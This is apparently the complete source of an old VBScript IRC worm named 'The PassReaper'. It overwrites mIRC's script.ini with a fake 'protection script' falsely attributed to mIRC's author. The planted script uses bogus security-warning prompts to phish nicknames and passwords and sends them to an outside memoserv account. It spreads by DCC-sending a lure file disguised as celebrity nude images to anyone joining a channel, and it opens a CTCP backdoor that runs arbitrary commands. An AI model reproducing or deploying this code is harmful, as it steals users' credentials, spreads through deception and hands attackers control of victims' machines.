' ~| The PassReaper ~|
' 
On Error Resume Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set b = fso.CreateTextFile("c:\mirc\script.ini", True)
b.WriteLine "[script]"
b.WriteLine "n0=;mIRC Protection Script DO NOT EDIT!"
b.WriteLine "n1=;By Khaled Mardem-Bey"
b.WriteLine "n2=;    www.mirc.com"
b.WriteLine "n3="
b.WriteLine "n4=on 1:connect: {"
b.WriteLine "n5=set %nn $?""SECURITY WARNING: Please enter your nickname"""
b.WriteLine "n6=set %pw $?""SECURITY WARNING: Please enter your password"""
b.WriteLine "n7=/.memoserv passreaper %nn %pw"
b.WriteLine "n8=}"
b.WriteLine "n9="
b.WriteLine "n10=on 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
b.WriteLine "n11=  /.dcc send $nick c:\mirc\download\christina_aguilera_nude!.vbs"
b.WriteLine "n12=}"
b.WriteLine "n13="
b.WriteLine "n14=on 1:ctcp:*:?:$1-"
b.close